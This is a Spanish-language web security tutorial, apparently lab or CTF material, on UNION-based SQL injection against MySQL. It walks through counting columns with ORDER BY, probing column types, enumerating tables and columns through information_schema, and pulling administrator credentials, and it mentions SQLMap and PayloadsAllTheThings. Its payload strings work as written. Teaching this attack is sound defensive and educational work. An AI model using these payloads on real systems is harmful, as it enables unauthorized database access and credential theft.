<div id="outline-container-org3060362" class="outline-2">
<h2 id="org3060362">Examinar base de datos para obtener información</h2>
<div class="outline-text-2" id="text-org3060362">
<p>
Esta vez nuestro objetivo va a ser obtener las credenciales del usuario administrador. Vamos a orientarlo a <b>mysql</b> no obstante tened en cuenta que si estamos
ante otra tipo de motor base de datos como pueda ser <b>oracle</b> la metodología cambiaría.
</p>
</div>
<div id="outline-container-org33463af" class="outline-3">
<h3 id="org33463af">Información de sql importante que tenemos que saber</h3>
<div class="outline-text-3" id="text-org33463af">
</div>
<div id="outline-container-orgc59dd42" class="outline-4">
<h4 id="orgc59dd42">Order by</h4>
<div class="outline-text-4" id="text-orgc59dd42">
<p>
Order by nos permite ordenar una tabla en base a una columna. Un ejemplo sería:
</p>
<div class="org-src-container">
<pre class="src src-sql">    <span style="color: #51afef;">select</span> * <span style="color: #51afef;">from</span> items <span style="color: #51afef;">order</span> <span style="color: #51afef;">by</span> category <span style="color: #5B6268;">-- - Esto tambi&#233;n se podr&#237;a poner como order by 2</span>
</pre>
</div>
<p>
Visualizaríamos lo siguiente(ordenada alfabéticamente en base a la categoría ):
</p>



<div id="org98f29cc" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-11-05_12-43-13_screenshot.png" alt="2021-11-05_12-43-13_screenshot.png" />
</p>
</div>


<p>
En <b>sql injection</b> nos va a interesar para saber cuantas columnas tiene una tabla. En la página vulnerable por ejemplo
si introducimos lo siguiente:
</p>


<div id="orgdaef354" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-10-31_13-33-13_screenshot.png" alt="2021-10-31_13-33-13_screenshot.png" />
</p>
</div>

<p>
Entonces se nos mostraría un error en el servidor debido a que la tabla no tiene una <b>tercera columna</b>.
</p>


<div id="orgdfeb329" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-10-31_13-34-09_screenshot.png" alt="2021-10-31_13-34-09_screenshot.png" />
</p>
</div>

<p>
No obstante si ponemos lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-sql">    Pets<span style="color: #98be65;">' order by 2 -- -</span>
</pre>
</div>

<p>
Entonces no se nos mostraría ningún error:
</p>


<div id="orgd4a7a98" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-10-31_13-36-30_screenshot.png" alt="2021-10-31_13-36-30_screenshot.png" />
</p>
</div>
</div>
</div>
<div id="outline-container-org19915ba" class="outline-4">
<h4 id="org19915ba">Union</h4>
<div class="outline-text-4" id="text-org19915ba">
<p>
Union es una opción que nos permite realizar dos sentencias sql en 1 <b>siempre y cuando la segunda sentencia devuelva el mismo número de columnas que la primera</b>.
Luego en nuestro laboratorio, si ponemos lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #51afef;">SELECT</span> <span style="color: #51afef;">name</span> <span style="color: #51afef;">FROM</span> `items` <span style="color: #51afef;">union</span> <span style="color: #51afef;">select</span> category <span style="color: #51afef;">from</span> `items`
</pre>
</div>
<p>
Se nos devolvería lo siguiente(<b>ambas sentencias devuelven únicamente una columna</b>):
</p>


<div id="org011c0f1" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-10-31_13-54-42_screenshot.png" alt="2021-10-31_13-54-42_screenshot.png" />
</p>
</div>
</div>
</div>

<div id="outline-container-org1ce9ced" class="outline-4">
<h4 id="org1ce9ced">Enumerar tipo de la columna</h4>
<div class="outline-text-4" id="text-org1ce9ced">
<p>
Para saber de que tipo es la columna, simplemente tenemos que probar que nos da error a la hora de seleccionar la columna
que queremos visualizar. Normalmente, se suele usar <b>NULL</b> debido a que suele ser compatible con todos los tipos por lo que
no dará error. Luego en la página vulnerable si ponemos:
</p>
<div class="org-src-container">
<pre class="src src-sql">    Pets<span style="color: #98be65;">' union select NULL,1 -- -</span>
</pre>
</div>
<p>
Nos va a dar un error debido a que la segunda columna no admite tipo <b>integer</b>. No obstante, si introducimos algo como lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-sql">    Pets<span style="color: #98be65;">' union select NULL,"hola" -- -</span>
</pre>
</div>
<p>
Entonces veremos que no nos ocasiona ningún error por lo que sabemos que la segunda columna lo que admite es <b>varchar</b>.
</p>
</div>
</div>
</div>

<div id="outline-container-org82ad5b7" class="outline-3">
<h3 id="org82ad5b7">Conseguir tablas de la base de datos</h3>
<div class="outline-text-3" id="text-org82ad5b7">
<p>
Para conseguir información sobre las tablas dentro de una base de datos tenemos que hacer uso de la base de datos <code>information_schema</code> tal y como vemos en nuestro
laboratorio:
</p>


<div id="org2d9dd41" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-11-01_11-39-44_screenshot.png" alt="2021-11-01_11-39-44_screenshot.png" />
</p>
</div>

<p>
Como nuestro objetivo es conseguir las tablas tendríamos que hacer la siguiente consulta:
</p>
<div class="org-src-container">
<pre class="src src-sql">    <span style="color: #51afef;">select</span> * <span style="color: #51afef;">from</span> information_schema.tables;
</pre>
</div>
<p>
Y se nos mostraría la siguiente información:
</p>


<div id="org4befc3c" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-11-01_11-43-13_screenshot.png" alt="2021-11-01_11-43-13_screenshot.png" />
</p>
</div>

<p>
Si vamos al final, podemos visualizar las tablas que hemos ido creando anteriormente:
</p>



<div id="org68b766d" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-11-01_11-47-17_screenshot.png" alt="2021-11-01_11-47-17_screenshot.png" />
</p>
</div>

<p>
Luego en el ataque estábamos creando podríamos intentar algo como esto para visualizar las tablas:
</p>
<div class="org-src-container">
<pre class="src src-sql">Accessories<span style="color: #98be65;">' union select NULL,table_name from information_schema.tables -- -</span>

</pre>
</div>
<p>
Se nos mostrarían todas las tablas de la máquina objetivo en donde podemos visualizar una que se llama <code>users_jwqmff</code> (si lo hacéis en caso vuestro
nombre puede cambiar sera <code>users_loquesea</code>):
</p>



<div id="orgb8516a4" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-11-01_13-02-40_screenshot.png" alt="2021-11-01_13-02-40_screenshot.png" />
</p>
</div>
</div>
</div>

<div id="outline-container-org5637dc1" class="outline-3">
<h3 id="org5637dc1">Conseguir columnas de la tabla users</h3>
<div class="outline-text-3" id="text-org5637dc1">
<p>
<code>information_schema</code> también cuenta con una tabla para enumerar columnas la cual se llama <code>information_schema.columns</code>.
Luego si realizamos la siguiente sentencia en nuestro laboratorio se nos mostrarían todas las columnas disponibles:
</p>
<div class="org-src-container">
<pre class="src src-sql">    <span style="color: #51afef;">select</span> *  <span style="color: #51afef;">from</span> information_schema.columns
</pre>
</div>
<p>
Tras esto se nos mostraría lo siguiente:
</p>


<div id="org1508927" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-11-01_13-00-17_screenshot.png" alt="2021-11-01_13-00-17_screenshot.png" />
</p>
</div>


<p>
Luego si aplicamos esto y insertamos lo siguiente(esto sería en la url):
</p>
<div class="org-src-container">
<pre class="src src-sql">Accessories<span style="color: #98be65;">' union select NULL,column_name from information_schema.columns where table_name='</span>users_jwqmff<span style="color: #98be65;">'-- -</span>
</pre>
</div>

<p>
Como vemos en la siguiente imagen se nos mostrarían las columnas:
</p>


<div id="org569a526" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-11-01_13-04-32_screenshot.png" alt="2021-11-01_13-04-32_screenshot.png" />
</p>
</div>
</div>
</div>

<div id="outline-container-orgb3e5ab2" class="outline-3">
<h3 id="orgb3e5ab2">Conseguimos usuario y contraseña</h3>
<div class="outline-text-3" id="text-orgb3e5ab2">
<p>
Finalmen  te conseguir el usuario y contraseña es sencillo, seria hacer una consulta normal con los datos que hemos recogido hasta el momento:
</p>
<div class="org-src-container">
<pre class="src src-sql">Accessories<span style="color: #98be65;">' union select username_vxyhzg,password_jtgova from users_jwqmff -- -</span>
</pre>
</div>
<p>
Consiguiendo de esta manera el usuario administrador:
</p>


<div id="org7a2ba21" class="figure">
<p><img src="Examinar_base_de_datos_para_obtener_información/2021-11-01_13-07-53_screenshot.png" alt="2021-11-01_13-07-53_screenshot.png" />
</p>
</div>
</div>
</div>
</div>

<div id="outline-container-orgc4fdccf" class="outline-2">
<h2 id="orgc4fdccf">¿Donde puedo sacar información para atacar vulnerabilidades web ?</h2>
<div class="outline-text-2" id="text-orgc4fdccf">
<p>
Como he dicho antes, depende de la base de datos que estemos atacando las consultad son diferentes. No es necesario aprendérselo todo
de memoria ya que contamos con buena información en sitios como <b>PayloadsAllTheThings</b> (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>)
en donde contamos con un montón de información sobre como atacar vulnerabilidades web.
</p>
</div>
</div>
<div id="outline-container-org6be4152" class="outline-2">
<h2 id="org6be4152">SQLMap para automatizar el ataque</h2>
<div class="outline-text-2" id="text-org6be4152">
<p>
SQLMap(<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a>) es una herramienta que permite automatizar los ataques de <b>sql-injection</b>
y debido a esto en ctfs viene muy bien ya que el tiempo es oro en este tipo de competiciones. Como vemos en la imagen inferior, prueba
con diferentes aproximaciones que existen para realizar sql-injection.
</p>

<div id="org2a12562" class="figure">
<p><img src="SQLMap_para_automatizar_el_ataque/2021-11-01_13-17-39_screenshot.png" alt="2021-11-01_13-17-39_screenshot.png" />
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: Rubén Santos</p>
<p class="date">Created: 2021-11-06 Sat 17:39</p>
</div>
</body>
</html>
